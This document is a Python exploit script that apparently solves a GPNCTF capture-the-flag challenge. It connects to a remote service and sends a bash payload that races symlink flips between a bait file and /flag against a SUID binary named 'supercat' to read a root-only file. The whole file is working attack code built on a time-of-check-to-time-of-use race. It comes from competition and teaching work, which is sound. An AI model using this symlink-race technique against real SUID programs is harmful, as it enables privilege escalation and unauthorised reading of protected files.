#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import sys
import time

FLAG_RE = re.compile(rb'GPNCTF\{[^}\r\n]+\}')


def build_payload(workers: int, seconds: int) -> str:
    # Pure POSIX-ish shell/Bash payload. The remote Docker image only installs socat,
    # so we avoid gcc/python/perl and use only bash/coreutils/grep.
    return f'''cat > /tmp/supercat_race.sh <<'EOF'
#!/bin/bash
set +e
WORKERS={workers}
SECONDS_LIMIT={seconds}

cleanup() {{
  kill $PIDS $FP $GP 2>/dev/null
  [ -n "$D" ] && rm -rf "$D" 2>/dev/null
}}

race_dir() {{
  D="/tmp/sc_dir_$(id -u)_$$_$RANDOM"
  rm -rf "$D"
  mkdir -p "$D/bait" || exit 1
  cd "$D" || exit 1
  echo bait > bait/flag
  ln -s bait d
  mkfifo out

  # Flip d between ./bait and / .  Metadata is checked on d/flag while d -> bait,
  # then supercat re-opens d/flag as root after d -> /, yielding /flag.
  ( while :; do ln -sfn bait d; ln -sfn / d; done ) &
  FP=$!

  grep -aEom1 'GPNCTF\\{{[^}}]+\\}}' out &
  GP=$!

  PIDS=""
  j=0
  while [ $j -lt "$WORKERS" ]; do
    ( while :; do /usr/local/bin/supercat d/flag > out 2>/dev/null; done ) &
    PIDS="$PIDS $!"
    j=$((j+1))
  done

  i=0
  while [ $i -lt "$SECONDS_LIMIT" ]; do
    if ! kill -0 "$GP" 2>/dev/null; then
      cleanup
      return 0
    fi
    sleep 1
    i=$((i+1))
  done
  cleanup
  echo '[!] dir race timed out'
  return 1
}}

race_file() {{
  D="/tmp/sc_file_$(id -u)_$$_$RANDOM"
  rm -rf "$D"
  mkdir -p "$D" || exit 1
  cd "$D" || exit 1
  echo bait > good
  ln -s good target
  mkfifo out

  # Fallback: flip the final pathname directly between a user-readable file and /flag.
  ( while :; do ln -sfn good target; ln -sfn /flag target; done ) &
  FP=$!

  grep -aEom1 'GPNCTF\\{{[^}}]+\\}}' out &
  GP=$!

  PIDS=""
  j=0
  while [ $j -lt "$WORKERS" ]; do
    ( while :; do /usr/local/bin/supercat target > out 2>/dev/null; done ) &
    PIDS="$PIDS $!"
    j=$((j+1))
  done

  i=0
  while [ $i -lt "$SECONDS_LIMIT" ]; do
    if ! kill -0 "$GP" 2>/dev/null; then
      cleanup
      return 0
    fi
    sleep 1
    i=$((i+1))
  done
  cleanup
  echo '[!] file race timed out'
  return 1
}}

race_dir || race_file
EOF
bash /tmp/supercat_race.sh
exit
'''


def connect(host: str, port: int, use_ssl: bool, timeout: float):
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.settimeout(timeout)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw


def main() -> int:
    ap = argparse.ArgumentParser(description='Exploit GPNCTF supercat TOCTOU SUID race over bash/socat')
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    ap.add_argument('--ssl', action='store_true', help='Use TLS, equivalent to ncat --ssl')
    ap.add_argument('--workers', type=int, default=48, help='parallel supercat loops on remote')
    ap.add_argument('--seconds', type=int, default=45, help='seconds per race strategy')
    ap.add_argument('--timeout', type=float, default=120.0, help='socket timeout')
    ap.add_argument('--save-transcript', default=None, help='write raw transcript to file')
    args = ap.parse_args()

    payload = build_payload(args.workers, args.seconds).encode()
    print(f'[+] connecting to {args.host}:{args.port} ssl={args.ssl}')
    print(f'[+] sending pure-shell TOCTOU race payload ({args.workers} workers, {args.seconds}s/strategy)')

    transcript = b''
    with connect(args.host, args.port, args.ssl, args.timeout) as s:
        s.sendall(payload)
        start = time.time()
        while time.time() - start < args.timeout:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            transcript += chunk
            m = FLAG_RE.search(transcript)
            if m:
                flag = m.group(0).decode(errors='replace')
                print(f'[+] extracted flag: {flag}')
                print('[+] proof: flag came from remote stdout matching GPNCTF{...} after running /usr/local/bin/supercat against raced path d/flag -> /flag')
                if args.save_transcript:
                    open(args.save_transcript, 'wb').write(transcript)
                    print(f'[+] transcript saved: {args.save_transcript}')
                return 0

    if args.save_transcript:
        open(args.save_transcript, 'wb').write(transcript)
        print(f'[+] transcript saved: {args.save_transcript}')
    print('[-] no flag found')
    tail = transcript[-2000:].decode(errors='replace')
    if tail:
        print('[transcript tail]')
        print(tail)
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
